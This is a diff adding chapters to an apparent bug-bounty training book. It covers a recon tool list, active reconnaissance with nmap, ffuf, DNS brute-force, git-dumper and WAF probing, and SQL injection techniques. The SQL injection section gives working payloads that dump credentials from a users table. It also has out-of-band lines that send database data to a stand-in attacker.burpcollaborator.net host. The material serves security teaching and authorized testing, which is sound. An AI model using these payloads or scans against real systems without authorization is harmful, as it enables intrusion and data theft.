+|`amass`|Subdomain|`go install`|Comprehensive subdomain enum|
+|`assetfinder`|Subdomain|`go install`|Quick passive subdomain check|
+|`httpx`|Probing|`go install`|Check which hosts are alive|
+|`gowitness`|Probing|`go install`|Screenshot live hosts|
+|`ffuf`|Discovery|`go install`|Directory/file/param fuzzing|
+|`katana`|Crawling|`go install`|Modern web crawler|
+|`waybackurls`|URLs|`go install`|Historical URL collection|
+|`gau`|URLs|`go install`|Multi-source URL collection|
+|`nuclei`|Scanning|`go install`|Template-based vuln scanning|
+|`dnsx`|DNS|`go install`|DNS resolution at scale|
+|`anew`|Utility|`go install`|Change detection|
+|`gf`|Utility|`go install`|Grep pattern matching on URLs|
+|`arjun`|Discovery|`pip install`|Hidden parameter discovery|
+
+---
+
+## Summary
+
+The reconnaissance tool ecosystem divides into four areas: subdomain discovery (subfinder, amass, assetfinder), HTTP probing (httpx, gowitness), URL and content discovery (ffuf, katana, waybackurls, gau), and information extraction (nuclei, gf, arjun). No tool is complete on its own — they are designed to chain together. Subfinder feeds httpx; httpx feeds nuclei and ffuf; gau and waybackurls feed gf and arjun. The complete pipeline runs in under an hour on most targets and produces a structured set of leads for manual testing. All tools should be rate-limited to avoid violating program policies and causing accidental denial of service.
+
+---
+
+## Checklist
+
+- [ ] subfinder installed and configured with at least one API key (GitHub token is free)
+- [ ] amass installed
+- [ ] assetfinder installed
+- [ ] httpx installed and working (`httpx -version`)
+- [ ] ffuf installed and working (`ffuf -h`)
+- [ ] katana installed
+- [ ] waybackurls installed
+- [ ] gau installed
+- [ ] nuclei installed and templates updated (`nuclei -update-templates`)
+- [ ] dnsx installed
+- [ ] anew installed
+- [ ] gf installed with gf-patterns cloned to `~/.gf`
+- [ ] arjun installed
+- [ ] gowitness installed
+- [ ] SecLists installed (`/usr/share/seclists/` or `~/wordlists/SecLists/`)
+- [ ] Ran the full pipeline against a practice target (HackTheBox, TryHackMe, or DVWA)
+- [ ] Understand what each tool's output means and how to interpret it
+---
 # PART THREE: RECONNAISSANCE
 
 ---
@@ -2923,6 +4054,542 @@ Passive reconnaissance gathers maximum information without touching the target. 
 - [ ] All findings organized in a structured document
 
 ---
+
+# Chapter 12: Active Reconnaissance
+
+## Objective
+
+Learn how to move from passive intelligence gathering to active reconnaissance — directly interacting with the target's infrastructure to enumerate live services, map attack surface, fingerprint technologies, and discover content that passive methods cannot find. Understand how to do this responsibly within program scope.
+
+## Prerequisites
+
+- Chapter 11: Passive Reconnaissance
+- Chapter 9: Reconnaissance Tools
+- Chapter 8: curl and the Command Line
+- Chapter 10: Bug Bounty Programs and Scope (read scope carefully before active recon)
+
+## Terminology
+
+|Term|Definition|
+|---|---|
+|**Active Reconnaissance**|Information gathering that involves sending traffic directly to the target|
+|**Port Scanning**|Probing a host to discover which TCP/UDP ports are open|
+|**Service Fingerprinting**|Identifying the software and version running on an open port|
+|**Banner Grabbing**|Reading the initial message a service sends when you connect to it|
+|**Technology Stack**|The combination of languages, frameworks, servers, and databases a target uses|
+|**Virtual Host**|Multiple websites hosted on a single IP address, differentiated by the Host header|
+|**Content Discovery**|Finding web paths and files that exist but are not linked from anywhere|
+|**DNS Brute-Force**|Trying a wordlist of subdomain names against DNS to find active records|
+|**Web Crawling**|Following links throughout a web application to map its structure|
+|**WAF**|Web Application Firewall — a security layer that may block some active recon|
+|**nmap**|Network Mapper — the industry standard port scanner|
+
+---
+
+## Theory
+
+### Passive vs Active: The Line
+
+Passive reconnaissance reads public data that already exists. Active reconnaissance generates new traffic that reaches the target's servers and network. This distinction matters because:
+
+1. **Active recon is visible** — the target's logs will record your requests
+2. **Active recon can violate program rules** — many programs prohibit automated scanners, DoS-style tools, or testing out-of-scope assets
+3. **Active recon can cause unintended impact** — aggressive scanning can slow or crash services
+
+**Before starting any active recon:** Confirm the target is in scope and re-read the program's rules about automated tools. Respect rate limits. Never scan out-of-scope assets.
+
+### The Active Recon Workflow
+
+```
+Subdomains (from passive recon)
+        ↓
+DNS Resolution (which subdomains are alive?)
+        ↓
+Port Scanning (what services are running?)
+        ↓
+Service Fingerprinting (what software/version?)
+        ↓
+HTTP Probing (which hosts serve web content?)
+        ↓
+Technology Detection (what stack are they running?)
+        ↓
+Virtual Host Discovery (are there hidden vhosts?)
+        ↓
+Content Discovery (what paths and files exist?)
+        ↓
+→ Feed results into vulnerability testing
+```
+
+---
+
+## Step 1: DNS Resolution at Scale
+
+Before port scanning or HTTP probing, resolve all subdomains to confirm which ones actually exist and what IPs they use.
+
+### Using dnsx
+
+```bash
+# Resolve all subdomains from passive recon
+cat all_subdomains.txt | dnsx -silent -a -resp
+
+# Output format: subdomain.example.com [IP_ADDRESS]
+# Only lines with IPs resolved successfully
+
+# Get CNAME records (critical for takeover detection)
+cat all_subdomains.txt | dnsx -silent -cname -resp
+
+# Get all record types at once
+cat all_subdomains.txt | dnsx -silent -a -cname -mx -ns -resp -o dns_records.txt
+
+# Extract just the IP addresses
+cat all_subdomains.txt | dnsx -silent -a -resp-only > resolved_ips.txt
+
+# Find wildcard DNS (if *.example.com resolves → may inflate subdomain counts)
+dnsx -d example.com -wt -silent
+```
+
+### Identifying IP Ranges
+
+Group subdomains by IP to understand infrastructure:
+
+```bash
+# Sort subdomains by IP to identify shared hosting
+cat dns_records.txt | sort -t'[' -k2 | sort -k2
+
+# Extract unique IPs
+cat dns_records.txt | grep -oP '\[\K[^\]]+' | sort -u > unique_ips.txt
+
+# WHOIS an IP to identify the hosting provider
+whois 93.184.216.34 | grep -i "orgname\|org-name\|netname\|descr"
+
+# Check if IPs are in scope (some programs specify ASN ranges)
+cat unique_ips.txt | while read ip; do
+  echo "$ip: $(whois $ip | grep -i 'orgname\|netname' | head -1)"
+done
+```
+
+---
+
+## Step 2: Port Scanning
+
+Port scanning tells you what services are running on each host — not just port 80 and 443. Exposed databases, admin interfaces, and development servers are often on non-standard ports.
+
+### nmap — The Standard
+
+```bash
+# Basic scan — top 1000 ports
+nmap 93.184.216.34
+
+# Scan common web ports (fast, targeted)
+nmap -p 80,443,8080,8443,8888,3000,4000,5000,8000,9000 93.184.216.34
+
+# Scan all 65535 ports (thorough but slow)
+nmap -p- 93.184.216.34
+
+# Version detection (identify software and version on each port)
+nmap -sV 93.184.216.34
+
+# OS detection + version + scripts
+nmap -sV -O 93.184.216.34
+
+# Run default scripts (useful for service enumeration)
+nmap -sC 93.184.216.34
+
+# Recommended combined scan
+nmap -sV -sC -p 80,443,8080,8443,3000,8000,8888,9000,3306,5432,6379,27017 \
+  93.184.216.34
+
+# Scan a list of IPs
+nmap -iL unique_ips.txt -p 80,443,8080,8443
+
+# Save output
+nmap -sV -oN nmap_output.txt 93.184.216.34
+nmap -sV -oX nmap_output.xml 93.184.216.34   # XML format
+nmap -sV -oG nmap_output.gnmap 93.184.216.34  # Grepable format
+
+# Faster scan with timing template (T4 = aggressive, T1 = slow/stealthy)
+nmap -T4 -p- 93.184.216.34
+```
+
+### naabu — Fast Port Scanner (for Lists)
+
+naabu is faster than nmap for scanning many hosts with limited port ranges:
+
+```bash
+# Install
+go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
+
+# Scan common ports across all live hosts
+cat live_hosts.txt | awk '{print $1}' | naabu -p 80,443,8080,8443,8888,3000,5000,9000
+
+# Save output
+naabu -list unique_ips.txt \
+      -p 80,443,8080,8443,3000,8000,8888,9000 \
+      -o open_ports.txt
+
+# Pipe into httpx for immediate probing
+naabu -list unique_ips.txt -p 80,443,8080,8443 | httpx -silent -sc -title
+```
+
+### What to Look For in Port Scan Results
+
+|Port|Service|Why It Matters|
+|---|---|---|
+|21|FTP|Misconfigured FTP may allow anonymous login or path traversal|
+|22|SSH|Version fingerprinting; brute-force if weak auth policies|
+|25/587|SMTP|Email server — SPF/DMARC bypass possibilities|
+|80/443|HTTP/HTTPS|Standard web — always in scope if domain is|
+|3000|Node.js/Grafana|Development servers, admin dashboards|
+|3306|MySQL|Database exposed to internet — critical finding|
+|5432|PostgreSQL|Database exposed to internet — critical finding|
+|6379|Redis|Redis without auth — often leads to RCE|
+|8080/8443|HTTP-alt|Admin panels, development servers, Jenkins|
+|8888|Jupyter/other|Jupyter Notebook without auth = immediate RCE|
+|9200|Elasticsearch|Exposed ES is usually unauthenticated — data exposure|
+|27017|MongoDB|Exposed MongoDB — often unauthenticated|
+
+**If you find an exposed database port:** Do NOT connect, query, or extract data. Simply document the open port and the service version, confirm it is internet-accessible, and report it as a critical misconfiguration.
+
+---
+
+## Step 3: Service Fingerprinting and Banner Grabbing
+
+Once you know which ports are open, identify what's running on them.
+
+### Using curl for HTTP Banners
+
+```bash
+# Check HTTP response headers for technology indicators
+curl -sI https://example.com | grep -i "server\|x-powered-by\|x-generator\|via"
+
+# Server: nginx/1.18.0
+# X-Powered-By: PHP/7.4.3
+# X-Generator: Drupal 9
+# Via: cloudflare
+
+# Check all subdomains for technology headers
+cat live_hosts.txt | awk '{print $1}' | while read host; do
+  echo "=== $host ==="
+  curl -sI "$host" | grep -i "server\|x-powered-by\|x-aspnet\|x-generator"
+done
+```
+
+### Using whatweb
+
+```bash
+# Install (usually pre-installed on Kali)
+sudo apt install whatweb
+
+# Fingerprint a single target
+whatweb https://example.com
+
+# Fingerprint multiple targets
+whatweb -i live_hosts.txt
+
+# Aggressive mode (more requests, more info)
+whatweb -a 3 https://example.com
+
+# Output in JSON
+whatweb https://example.com --log-json=output.json
+```
+
+### httpx Technology Detection
+
+```bash
+# Detect technologies while probing
+cat all_subdomains.txt | httpx -silent -tech-detect -sc -title
+
+# Output example:
+# https://blog.example.com [200] [Blog - Example] [WordPress,PHP,MySQL,Apache]
+# https://api.example.com [200] [API] [Express,Node.js]
+# https://shop.example.com [200] [Store] [Shopify]
+```
+
+---
+
+## Step 4: Virtual Host Discovery
+
+A single IP address can serve multiple websites, differentiated only by the `Host` header. Virtual host discovery finds websites not listed in DNS that share an IP with an in-scope target.
+
+```bash
+# Using ffuf for vhost discovery
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     -u https://93.184.216.34 \
+     -H "Host: FUZZ.example.com" \
+     -mc 200,301,302,403 \
+     -fs 1234   # Filter out the default response size (test manually first)
+
+# Using gobuster for vhost discovery
+gobuster vhost \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -u https://example.com \
+  --append-domain
+
+# Check if different Host headers produce different responses
+curl -sI https://93.184.216.34 -H "Host: www.example.com" | head -5
+curl -sI https://93.184.216.34 -H "Host: admin.example.com" | head -5
+curl -sI https://93.184.216.34 -H "Host: internal.example.com" | head -5
+```
+
+---
+
+## Step 5: DNS Brute-Force
+
+Even after passive enumeration, active DNS brute-forcing with a good wordlist finds additional subdomains.
+
+```bash
+# Generate candidate subdomains and resolve them
+# Method 1: dnsx with a wordlist
+cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | \
+  awk '{print $1".example.com"}' | \
+  dnsx -silent -a -resp > brute_results.txt
+
+# Method 2: Combine with massdns for speed
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-20000.txt
+
+massdns -r resolvers.txt \
+        -t A \
+        -o S \
+        -w massdns_output.txt \
+        <(cat subdomains-top1million-20000.txt | awk '{print $1".example.com"}')
+
+# Method 3: amass active brute-force
+amass enum -brute -d example.com \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
+  -o amass_brute.txt
+
+# Permutation-based subdomain discovery (generate variations of known subdomains)
+# If you found "api.example.com", try:
+# api-v2.example.com, api-dev.example.com, api-staging.example.com, etc.
+
+# Using gotator for permutations
+go install github.com/Josue87/gotator@latest
+echo "api" | gotator -sub example.com -depth 1 -silent | dnsx -silent -a -resp
+```
+
+---
+
+## Step 6: Web Content Discovery
+
+Find paths, files, and directories that exist on a web server but are not linked from anywhere in the application.
+
+```bash
+# Using ffuf — the standard approach
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+     -u https://example.com/FUZZ \
+     -mc 200,301,302,403 \
+     -t 50
+
+# Important: find your baseline 404 size first
+curl -s https://example.com/thispathclearlydoesnotexist12345 | wc -c
+# → 1234 bytes
+
+# Then filter it out
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+     -u https://example.com/FUZZ \
+     -mc all -fs 1234
+
+# Fuzz for sensitive files specifically
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
+     -u https://example.com/FUZZ \
+     -mc 200,301,302,403
+
+# Fuzz with extensions
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+     -u https://example.com/FUZZ \
+     -e .php,.bak,.env,.xml,.json,.conf,.yaml,.log \
+     -mc 200,301,302,403
+
+# High-priority paths to always check manually
+for path in robots.txt sitemap.xml .git/ .env .htaccess server-status phpinfo.php \
+            wp-login.php admin/ administrator/ api/docs swagger.json openapi.json \
+            console debug actuator actuator/env .DS_Store crossdomain.xml; do
+  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://example.com/$path")
+  [ "$STATUS" != "404" ] && echo "[$STATUS] /$path"
+done
+```
+
+---
+
+## Step 7: Technology-Specific Active Checks
+
+Once you know the technology stack, run targeted active checks.
+
+### WordPress
+
+```bash
+# Enumerate WordPress users, plugins, and themes
+wpscan --url https://example.com --enumerate u,p,t
+
+# Detect vulnerable plugins
+wpscan --url https://example.com --enumerate vp --api-token YOUR_TOKEN
+
+# Check common WordPress paths
+curl -s https://example.com/wp-login.php | grep -i "wordpress\|wp-login"
+curl -s https://example.com/wp-json/wp/v2/users | jq '.[].name'
+```
+
+### Spring Boot (Java)
+
+```bash
+# Check for exposed Spring Boot Actuator endpoints
+for endpoint in actuator actuator/env actuator/health actuator/info \
+                actuator/beans actuator/mappings actuator/dump actuator/trace; do
+  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://example.com/$endpoint")
+  [ "$STATUS" != "404" ] && echo "[$STATUS] /$endpoint"
+done
+
+# /actuator/env may expose environment variables including database passwords
+# /actuator/mappings reveals all Spring routes (full API map)
+```
+
+### GraphQL
+
+```bash
+# Find GraphQL endpoints
+for path in graphql api/graphql graphiql api/graphiql query api/query; do
+  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://example.com/$path")
+  [ "$STATUS" != "404" ] && echo "[$STATUS] /$path"
+done
+
+# Test if introspection is enabled
+curl -s -X POST https://example.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{__schema{types{name}}}"}' | jq '.data.__schema.types[0]'
+```
+
+### Git Repository Exposure
+
+```bash
+# Check for exposed .git directory
+curl -s https://example.com/.git/HEAD
+# If response is "ref: refs/heads/main" → Git repo is exposed
+
+# Use git-dumper to extract the full repository
+pip3 install git-dumper --break-system-packages
+git-dumper https://example.com/.git/ output_directory/
+
+# Read the extracted source code
+ls -la output_directory/
+```
+
+---
+
+## Step 8: WAF Detection
+
+Knowing whether a WAF is present helps you adjust your testing approach.
+
+```bash
+# Use wafw00f to detect WAFs
+pip3 install wafw00f --break-system-packages
+wafw00f https://example.com
+
+# Manual WAF detection — send a basic XSS payload and observe the response
+curl -s "https://example.com/search?q=<script>alert(1)</script>" | \
+  head -20
+# A WAF typically returns a "Request blocked" page or a 403/406
+
+# Check if Cloudflare is present (common indicator)
+curl -sI https://example.com | grep -i "cf-ray\|cf-cache\|cloudflare\|server.*cloudflare"
+
+# Check for Akamai
+curl -sI https://example.com | grep -i "akamai\|x-check-cacheable\|x-akamai"
+```
+
+---
+
+## Organizing Active Recon Results
+
+Create a structured summary after each active recon phase:
+
+```markdown
+# Active Recon Results: example.com
+## Date: YYYY-MM-DD
+
+## Live Hosts (httpx results)
+- https://www.example.com [200] [Main Site] [WordPress,PHP,Apache]
+- https://api.example.com [200] [API] [Express,Node.js]
+- https://dev.example.com [200] [Dev Server] [React,nginx] ← INTERESTING
+- https://admin.example.com [403] [Admin Panel] ← INTERESTING
+- https://shop.example.com [200] [Store] [Shopify]
+
+## Open Ports (naabu/nmap results)
+- api.example.com: 80, 443, 8080 (HTTP-alt exposed)
+- dev.example.com: 80, 443, 3000 (Node.js on 3000 — likely dev server)
+- db.example.com: 80, 443, 3306 (MySQL exposed!) ← CRITICAL
+
+## Technologies Identified
+- Web servers: Apache 2.4, nginx/1.18.0
+- Languages: PHP 7.4, Node.js 16
+- Frameworks: WordPress 6.1, Express.js
+- CDN: Cloudflare on www.example.com and shop.example.com
+- No WAF detected on dev.example.com ← TEST HEAVILY
+
+## Content Discovery Findings
+- /robots.txt: Disallows /admin, /internal-api, /staff-portal
+- /api/docs: [200] Swagger UI found — 47 documented endpoints
+- /actuator/env: [200] Spring Boot actuator exposed ← CRITICAL
+- /.env: [403] File exists but blocked (try bypass techniques)
+- /.git/HEAD: [200] Git repository exposed on dev.example.com
+
+## DNS Brute-Force New Findings
+- internal.example.com [resolves] ← Not found in passive recon
+- staging.example.com [resolves] ← Staging environment found
+
+## Priority Targets for Manual Testing
+1. dev.example.com:3000 — no WAF, likely no auth hardening
+2. /actuator/env on api.example.com — may leak credentials
+3. MySQL on db.example.com — internet-exposed database
+4. /api/docs — 47 endpoints to test systematically
+5. internal.example.com — newly discovered, untested
+```
+
+---
+
+## Responsible Active Recon
+
+Always apply these rules during active reconnaissance:
+
+```
+✓ Stay within defined scope
+✓ Rate-limit all tools (httpx -rl 50, nuclei -rate-limit 30, ffuf -rate 100)
+✓ Avoid scanning at maximum speed — it can cause unintended DoS
+✓ Do not scan explicitly out-of-scope assets even if you discover their IPs
+✓ Stop immediately if you accidentally access private data
+✓ Do not login to third-party services with credentials you find (report them)
+✓ If you find an exposed database, document it without querying data
+
+✗ Never run nmap -T5 (paranoid aggressive speed) against production targets
+✗ Never use --flood or DoS-style options
+✗ Never brute-force login pages with thousands of attempts (check rate limiting gently)
+✗ Never test on mobile apps or other platforms unless explicitly in scope
+```
+
+---
+
+## Summary
+
+Active reconnaissance builds on passive recon by directly interacting with the target. The workflow moves from DNS resolution through port scanning, service fingerprinting, virtual host discovery, DNS brute-forcing, and content discovery. Key findings include exposed databases on non-standard ports, development servers without WAFs, Git repositories, Spring Boot actuators, and admin panels discovered through fuzzing. Every active recon step should be rate-limited and scoped carefully. The organized output — a structured list of live hosts, open ports, technologies, and interesting findings — becomes the map for all subsequent vulnerability testing.
+
+---
+
+## Checklist
+
+- [ ] Resolved all passive recon subdomains with dnsx — identified live hosts with A records
+- [ ] Extracted unique IPs and verified they belong to the target organization (WHOIS)
+- [ ] Port scanned all live hosts for common service ports (80, 443, 8080, 8443, 3000, 3306, 5432, 6379, 8888, 9200, 27017)
+- [ ] Ran nmap service version detection (`-sV`) on open ports
+- [ ] Identified the technology stack using whatweb and httpx tech-detect
+- [ ] Checked for virtual hosts on all resolved IPs
+- [ ] Ran DNS brute-force with a top-5000 subdomain wordlist
+- [ ] Checked for Git repository exposure (`.git/HEAD`)
+- [ ] Checked for `.env`, `robots.txt`, `sitemap.xml`, and common sensitive paths
+- [ ] Ran ffuf directory discovery on all live hosts
+- [ ] Ran technology-specific checks (WordPress, Spring Boot Actuator, GraphQL) where applicable
+- [ ] Checked for WAF presence on all hosts
+- [ ] Documented all findings in a structured active recon summary
+- [ ] Rate-limited all tools appropriately
+- [ ] Did not scan out-of-scope assets
 
 # Chapter 13: Subdomain Enumeration
 
@@ -4704,10 +6371,1150 @@ XSS is the injection of JavaScript into a page that executes in another user's b
 
 ---
 
+# Chapter 16: SQL Injection
 
+## Objective
+
+Understand SQL injection completely — how relational databases work, why injection occurs, every major technique for detecting and exploiting it, how to use sqlmap effectively, and how to demonstrate impact responsibly in a bug bounty context. SQL injection remains one of the most critical and well-rewarded vulnerability classes.
+
+## Prerequisites
+
+- Chapter 3: HTTP — The Language of the Web
+- Chapter 7: Burp Suite — Complete Guide
+- Chapter 14: Web Application Mapping
+- Basic understanding of what a database is
+
+## Terminology
+
+|Term|Definition|
+|---|---|
+|**SQL**|Structured Query Language — the language used to communicate with relational databases|
+|**Database**|An organized collection of structured data|
+|**Table**|A structured data set within a database (like a spreadsheet tab)|
+|**Column**|A field in a table (e.g., `username`, `email`, `password`)|
+|**Row**|A single record in a table|
+|**Query**|A SQL statement sent to the database|
+|**DBMS**|Database Management System — the software running the database (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)|
+|**SQLi**|SQL Injection — the vulnerability class|
+|**In-band SQLi**|Injection where the result is returned in the HTTP response|
+|**Error-based SQLi**|Injection that retrieves data through database error messages|
+|**Union-based SQLi**|Injection that appends a `UNION SELECT` to retrieve data from other tables|
+|**Blind SQLi**|Injection where no data is returned — you infer results from application behavior|
+|**Boolean-based blind**|Blind injection that asks true/false questions via application response differences|
+|**Time-based blind**|Blind injection that uses sleep/delay functions to infer information|
+|**Out-of-Band SQLi**|Injection that exfiltrates data through DNS or HTTP requests|
+|**sqlmap**|An open-source automated SQL injection tool|
+|**INFORMATION_SCHEMA**|A virtual database in most DBMSes that stores metadata about all databases and tables|
+|**Stacked queries**|Executing multiple SQL statements in sequence (DBMS-dependent)|
+|**Second-order injection**|User input stored safely but later used unsafely in another query|
 
 ---
 
+## Theory
+
+### How SQL Injection Happens
+
+Web applications communicate with databases using SQL queries. A login form might generate:
+
+```sql
+SELECT * FROM users WHERE username = 'alice' AND password = 'secret';
+```
+
+The application builds this query by concatenating user input:
+
+```python
+# Vulnerable Python code
+query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+```
+
+If `username` = `alice` and `password` = `secret`, the query is safe. But if the application does not sanitize input, an attacker can break out of the string context and inject arbitrary SQL:
+
+```
+username: admin'--
+password: anything
+```
+
+The generated query becomes:
+
+```sql
+SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything';
+```
+
+The `--` is a SQL comment — everything after it is ignored. The query now asks: "Find a user named admin" — with no password check. If a user named `admin` exists, the attacker logs in.
+
+### Why SQLi Still Exists
+
+SQL injection has been known for decades yet remains a top-ranked vulnerability because:
+
+1. String concatenation in queries is still taught in tutorials
+2. Legacy codebases that predate parameterized queries
+3. Raw queries used for performance or flexibility in ORMs
+4. Stored procedures that concatenate internally
+5. Second-order injection in complex data pipelines
+
+### The Database Landscape
+
+Different database systems (DBMS) use slightly different syntax. Knowing which DBMS you are targeting determines which payloads work.
+
+|DBMS|Identifies Via|Comment Syntax|String Concat|
+|---|---|---|---|
+|MySQL|`VERSION()` returns `8.x.x`|`--` or `#`|`CONCAT(a,b)` or `'a' 'b'`|
+|PostgreSQL|`VERSION()` returns `PostgreSQL 14`|`--`|`\|`|
+|Microsoft SQL Server|`@@VERSION`|`--` or `/**/`|`+`|
+|Oracle|`v$version`|`--`|`\|`|
+|SQLite|`sqlite_version()`|`--`|`\|`|
+
+---
+
+## Finding SQL Injection
+
+### Step 1: Identify Injection Points
+
+Any parameter that might interact with a database is a candidate:
+
+- URL parameters: `?id=1`, `?user=alice`, `?category=shoes`
+- POST body fields: login forms, search boxes, filters
+- HTTP headers: `User-Agent`, `X-Forwarded-For`, `Referer`, `Cookie` values
+- JSON/XML API parameters
+- Path segments: `/users/123/profile`
+- Search and sort parameters: `?sort=price`, `?order=desc`
+
+### Step 2: Send Probe Characters
+
+Send characters that break SQL syntax and observe the response:
+
+```
+'          Single quote — closes a string literal
+''         Doubled single quote — escapes a string literal (tests for proper escaping)
+`          Backtick (MySQL identifier quoting)
+)          Closes a function/parenthesis
+'--        Quote + comment (bypasses remainder of query)
+' OR '1'='1  Classic boolean test
+```
+
+Look for:
+
+- **SQL error messages** — "You have an error in your SQL syntax", "ORA-01756", "pg_query()"
+- **Different response size** — page looks different, content changes
+- **Application errors** — 500 Internal Server Error where 200 was returned
+- **Behavioral differences** — login succeeds where it should fail
+
+```bash
+# Quick probe via curl
+curl -s "https://example.com/products?id=1'"
+curl -s "https://example.com/products?id=1'--"
+curl -s "https://example.com/search?q=test'"
+
+# Compare responses
+curl -s "https://example.com/user?id=1 AND 1=1" | wc -c   # True condition
+curl -s "https://example.com/user?id=1 AND 1=2" | wc -c   # False condition
+# Different sizes → boolean-based SQLi
+```
+
+---
+
+## SQL Injection Types — Detection and Exploitation
+
+### Type 1: In-Band Error-Based SQLi
+
+The database error message is returned directly in the response, revealing database structure.
+
+**Detection:**
+
+```sql
+' 
+''
+')
+'--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--  (MySQL)
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- (MSSQL)
+```
+
+**Exploitation (MySQL):**
+
+```sql
+-- Get the database version
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+
+-- Get current database name
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
+
+-- List all databases
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(schema_name) FROM information_schema.schemata)))--
+
+-- List tables in current database
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
+
+-- Get column names from a specific table
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users')))--
+
+-- Extract data
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT concat(username,':',password) FROM users LIMIT 0,1)))--
+```
+
+---
+
+### Type 2: Union-Based SQLi
+
+Append a `UNION SELECT` statement to retrieve data from other tables in the same response.
+
+**Prerequisite:** The number of columns in the injected query must match the original query.
+
+**Step 1: Find the number of columns**
+
+```sql
+-- Increment ORDER BY until you get an error
+' ORDER BY 1--   → no error
+' ORDER BY 2--   → no error
+' ORDER BY 3--   → no error
+' ORDER BY 4--   → error → query has 3 columns
+
+-- Alternative: NULL padding
+' UNION SELECT NULL--          → error (1 column attempt)
+' UNION SELECT NULL,NULL--     → error (2 columns)
+' UNION SELECT NULL,NULL,NULL-- → success (3 columns confirmed)
+```
+
+**Step 2: Find which columns are displayed**
+
+```sql
+' UNION SELECT 'A',NULL,NULL--
+' UNION SELECT NULL,'A',NULL--
+' UNION SELECT NULL,NULL,'A'--
+-- The column that shows 'A' in the response is your data extraction point
+```
+
+**Step 3: Extract data**
+
+```sql
+-- Assuming column 2 is displayed and the DBMS is MySQL
+
+-- Get database version
+' UNION SELECT NULL,version(),NULL--
+
+-- Get current database
+' UNION SELECT NULL,database(),NULL--
+
+-- List all databases
+' UNION SELECT NULL,group_concat(schema_name),NULL FROM information_schema.schemata--
+
+-- List tables
+' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
+
+-- Get columns of users table
+' UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--
+
+-- Extract credentials
+' UNION SELECT NULL,concat(username,':',password),NULL FROM users LIMIT 0,1--
+-- Change LIMIT 0,1 → 1,1 → 2,1 for next records
+
+-- Extract all at once (may be truncated)
+' UNION SELECT NULL,group_concat(username,':',password SEPARATOR '\n'),NULL FROM users--
+```
+
+---
+
+### Type 3: Boolean-Based Blind SQLi
+
+No data is returned directly. You infer information by asking true/false questions and observing differences in the response (page content, length, status code).
+
+**Detection:**
+
+```sql
+' AND 1=1--   → normal response (true condition)
+' AND 1=2--   → different response (false condition)
+-- If these differ: boolean-based blind injection confirmed
+```
+
+**Exploitation — extracting data character by character:**
+
+```sql
+-- Is the first character of the database name 's'?
+' AND SUBSTRING(database(),1,1)='s'--
+
+-- Is the first character of the database name ASCII value greater than 100?
+' AND ASCII(SUBSTRING(database(),1,1))>100--
+
+-- Is the first character of the database name ASCII value equal to 115? (= 's')
+' AND ASCII(SUBSTRING(database(),1,1))=115--
+```
+
+This is tedious manually. Use Burp Intruder to iterate through characters, or use sqlmap.
+
+**Automating with Burp Intruder:**
+
+```
+Position:  ' AND ASCII(SUBSTRING(database(),§POSITION§,1))=§ASCII_VALUE§--
+Attack type: Pitchfork
+Payload 1: Numbers 1-20 (character position)
+Payload 2: Numbers 32-126 (printable ASCII range)
+
+Compare response lengths — where length differs from the false condition = correct character
+```
+
+---
+
+### Type 4: Time-Based Blind SQLi
+
+No difference in response content — but a deliberate delay reveals a true condition.
+
+**Detection:**
+
+```sql
+-- MySQL
+' AND SLEEP(5)--           → 5-second delay? → injection confirmed
+
+-- PostgreSQL
+' AND pg_sleep(5)--
+
+-- MSSQL
+'; WAITFOR DELAY '0:0:5'--
+
+-- Oracle
+' AND dbms_pipe.receive_message('a',5)--
+```
+
+**Exploitation:**
+
+```sql
+-- Is the first character of database() equal to 's'? (if true: 5 second delay)
+' AND IF(SUBSTRING(database(),1,1)='s',SLEEP(5),0)--
+
+-- PostgreSQL equivalent
+' AND (SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='s') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+
+-- MSSQL equivalent
+'; IF (SUBSTRING(DB_NAME(),1,1)='s') WAITFOR DELAY '0:0:5'--
+```
+
+---
+
+### Type 5: Out-of-Band (OOB) SQLi
+
+When no HTTP-based indicator is possible, exfiltrate data through DNS or HTTP requests from the database server.
+
+```sql
+-- MySQL — DNS exfiltration via LOAD_FILE (requires FILE privilege)
+' AND LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.burpcollaborator.net\\test'))--
+
+-- MSSQL — DNS exfiltration via xp_dirtree
+'; exec master..xp_dirtree '\\'+@@version+'.attacker.burpcollaborator.net\test'--
+
+-- Oracle — HTTP exfiltration via UTL_HTTP
+' UNION SELECT UTL_HTTP.REQUEST('http://attacker.burpcollaborator.net/'||(SELECT banner FROM v$version WHERE rownum=1)) FROM dual--
+```
+
+Set up Burp Collaborator first, then observe DNS/HTTP callbacks confirming injection.
+
+---
+
